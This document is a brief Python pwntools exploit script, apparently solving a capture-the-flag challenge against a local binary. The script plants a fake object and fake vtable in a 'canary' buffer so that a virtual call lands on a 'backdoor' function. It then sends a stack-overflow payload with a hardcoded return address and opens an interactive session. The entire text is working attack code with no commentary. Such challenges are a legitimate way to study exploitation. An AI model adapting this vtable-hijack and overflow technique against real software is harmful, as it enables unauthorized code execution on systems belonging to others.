from pwn import *
context.log_level='DEBUG'
context.arch='AMD64'
p=process("./a.out")
e=ELF("./a.out")
fake_vtable=[0,e.sym['_ZL8backdoorv']]
fake_obj=[e.sym['user_canary']+8]
u_canary=b''.join(map(p64,fake_obj+fake_vtable)).ljust(8*8,b'\x00')

payload=b'a'*(0x88-0x20)+p64(0x403407)+p64(e.sym['user_canary'])+b'\n'
p.sendafter(b'To increase entropy, give me your canary\n',u_canary)
p.sendafter(b'input something to pwn :)\n',payload)
p.interactive()
